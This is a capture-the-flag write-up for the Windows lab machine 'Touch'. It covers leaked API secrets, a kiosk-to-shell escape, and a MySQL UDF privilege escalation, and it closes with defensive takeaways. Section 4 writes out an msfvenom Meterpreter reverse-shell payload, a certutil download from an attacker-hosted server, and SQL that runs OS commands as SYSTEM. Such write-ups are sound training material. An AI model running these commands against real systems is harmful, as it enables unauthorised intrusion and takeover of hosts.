# HTB Touch — Writeup

*Windows · Kiosk breakout · MySQL UDF privilege escalation*

## Overview

Touch is a Windows box built around a kiosk-mode passport-scanning terminal. I got user through a chain of web-exposed secrets and a kiosk-to-desktop escape, then got root through a classic MySQL UDF privilege escalation enabled by a misconfigured plugin directory.

---

## 1. Recon

I started with a standard nmap scan:

```
nmap -sV -sC <target_ip>
```

| Port | Service |
| --- | --- |
| 135 | msrpc |
| 3389 | ms-wbt-server (RDP) |
| 5985 | WinRM (HTTP) |
| 8443 | HTTP — "Nexion DeviceHub" login page |

No domain-related ports showed up (no LDAP, no Kerberos), so I figured this was a standalone/workgroup machine rather than a domain-joined one. The web app on 8443 looked like the obvious way in.

---

## 2. Web Enumeration — Nexion DeviceHub

The login page on `:8443` only asked for a **device password**. I checked the page source and found a hint: the default password is the device's serial number.

I ran gobuster and found an `/api` route:

```
gobuster dir -u http://<target_ip>:8443 -w /usr/share/wordlists/dirb/common.txt -b 302,404
```

`/api` on its own didn't show anything useful, so I ran gobuster again against it as its own base path:

```
gobuster dir -u http://<target_ip>:8443/api -w /usr/share/wordlists/dirb/common.txt -b 302,404
```

That turned up `/api/status`, which leaked the device's serial number — I used it as the login password.

Inside the dashboard I found controls for the kiosk's printer/scanner hardware, plus a set of **Windows kiosk credentials** sitting right there in plaintext.

> Why this matters: this one leaked status endpoint is the root cause of everything that follows — the serial number unlocks the dashboard, the dashboard leaks OS credentials, and those credentials unlock the kiosk session.

---

## 3. Kiosk Breakout → User Flag

1. I logged into the Windows kiosk session over RDP with the leaked creds:

```
xfreerdp /u:KioskUser /p:'<password>' /v:<target_ip>
```

The session was locked to a single-purpose kiosk app (a passport-scanning flow), with no obvious way to reach a normal desktop.

2. Using a booking confirmation (name + code) the challenge gave me, the kiosk app asked me to scan a passport.
3. Back in the DeviceHub dashboard, I disabled the scanner remotely. Back on the kiosk, the scan step now failed and showed an error with a link to a troubleshooting article.
4. I clicked that link and it opened the error page in Microsoft Edge — breaking me out of the locked-down kiosk shell into a full browser window.
5. From Edge, I hit `Ctrl+O` to open a file picker, then typed `cmd` into the file-path field — that launched a command prompt. Classic file-dialog-to-shell kiosk escape.
6. With a working shell, I read the user flag:

```
type C:\Users\<user>\Desktop\user.txt
```

**user.txt captured.**

---

## 4. Privilege Escalation → SYSTEM

### Getting a stable session

A raw cmd.exe shell is fragile, so I set up a Meterpreter session instead:

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<tun0_ip> LPORT=4444 -f exe -o shell.exe
```

I hosted it with Python's built-in HTTP server and pulled it onto the target with the built-in `certutil` utility (no extra tools needed on the Windows side):

```
python3 -m http.server 8000
certutil -urlcache -split -f http://<tun0_ip>:8000/shell.exe shell.exe
```

I had a Metasploit multi/handler already listening on the same LHOST/LPORT, so it caught the callback as soon as I ran `shell.exe` on target.

### Enumeration

I ran the usual context checks — `whoami /priv`, `whoami /groups`, `sysinfo` — but nothing jumped out as an easy token-based privesc path (no juicy privileges like `SeImpersonate`).

Poking around the filesystem, I found a local **MySQL 8.0** install running as **LocalSystem** — a red flag worth noting immediately, since any way of getting MySQL to run OS commands would inherit SYSTEM rights.

I kept digging and found:

- A config file for the kiosk's backend app (`\Kiosk\packages\backend\src\database\index.ts`) with a low-privileged MySQL username and password.
- That account didn't have anything useful, so I kept looking.
- A batch script at `ProgramData\HTB Airways\refresh-dates.bat` with the **MySQL root password** in plaintext.

### The UDF chain

1. I logged into MySQL as root and checked my privileges:

```
mysql -u root -p'<root_pass>' -e "SHOW GRANTS FOR CURRENT_USER();"
```

Root had both **FILE** and **GRANT** privileges. FILE is the key one here — it lets a SQL user write arbitrary files to disk.

2. I checked where MySQL loads plugins from, then checked that folder's permissions:

```
mysql -u root -p'<root_pass>' -e "SHOW VARIABLES LIKE 'plugin_dir';"
icacls C:\MySQL\lib\plugin\
```

Result: `NT AUTHORITY\Authenticated Users` had **Modify** rights on a folder MySQL fully trusts. That ACL misconfiguration — not the UDF feature itself — is the actual bug here.

3. I dropped the well-known `lib_mysqludf_sys_64.dll` library into that writable plugin directory (same delivery trick as before: Python HTTP server + `certutil`).
4. I registered a function from that library as a MySQL UDF:

```sql
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll';
```

5. I checked what context it ran under:

```sql
SELECT sys_eval('whoami');
```

It came back `nt authority\system` — SQL queries were now running OS commands as SYSTEM.

6. I used the same function to grab the root flag:

```sql
SELECT sys_eval('type C:\Users\Administrator\Desktop\root.txt');
```

**root.txt captured.**

---

## 5. Takeaways

- **Least privilege for services.** Running MySQL as `LocalSystem` turned an otherwise contained SQL misconfiguration into instant SYSTEM. A dedicated, low-privilege service account would've kept the damage contained.
- **Folder permissions are trust boundaries.** A folder a privileged process trusts (plugin dir, service binary path, scheduled-task script) being writable by a broad group like `Authenticated Users` is one of the most common Windows privesc patterns — the same basic shape shows up as DLL hijacking, unquoted service paths, and scheduled-task hijacking elsewhere.
- **Databases can run code, not just store it.** MySQL UDFs, MSSQL's `xp_cmdshell`, Postgres's `COPY ... PROGRAM` — enough database privilege can translate straight into OS command execution.
- **Small leaks add up.** Credentials leaked from an admin panel → an app config file → a batch script. None of these alone was catastrophic, but together they were.
- **Kiosk hardening gaps.** One reachable "Open File" dialog inside a trusted browser was enough to blow the whole kiosk lockdown — a reminder that kiosk security means locking down everything the kiosk can reach, not just the kiosk shell itself.
